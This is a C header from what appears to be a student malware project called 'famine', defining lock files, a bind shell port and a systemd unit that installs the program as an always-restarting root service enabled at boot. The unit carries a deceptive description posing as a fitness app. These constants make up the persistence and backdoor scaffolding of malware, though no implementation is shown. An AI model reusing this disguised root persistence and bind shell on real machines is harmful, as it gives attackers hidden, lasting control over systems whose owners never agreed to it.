/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.h                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/19 11:01:52 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/19 11:03:11 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

typedef struct s_service_ctx
{
	int		lock_fd;
	bool	super_user;
}	t_service_ctx;

#define SUPER_USER_LOCK_FILE "/var/lock/famine.lock"
#define WEAK_LOCK_FILE "/tmp/famine.lock"

#define BIND_SHELL_PORT 4242

#define SERVICE_FILE "/etc/systemd/system/famine.service"
#define SERVICE_START "sudo systemctl start famine.service &"
#define SERVICE_ENABLE "systemctl enable famine.service &"
#define SERVICE_FILE_CONTENT "\
[Unit]\n\
Description=Fitness app to track eating habits (for real, trust me...)\n\
After=network.target\n\
StartLimitIntervalSec=0\n\
[Service]\n\
Type=forking\n\
PIDFile=/var/lock/famine.lock\n\
Restart=always\n\
RestartSec=1\n\
User=root\n\
ExecStart=/bin/famine\n\
\n\
[Install]\n\
WantedBy=multi-user.target"

int		run_service();

int		lock_lock(t_service_ctx *ctx, const char *path);
int		unlock_lock(t_service_ctx *ctx, const char *path);
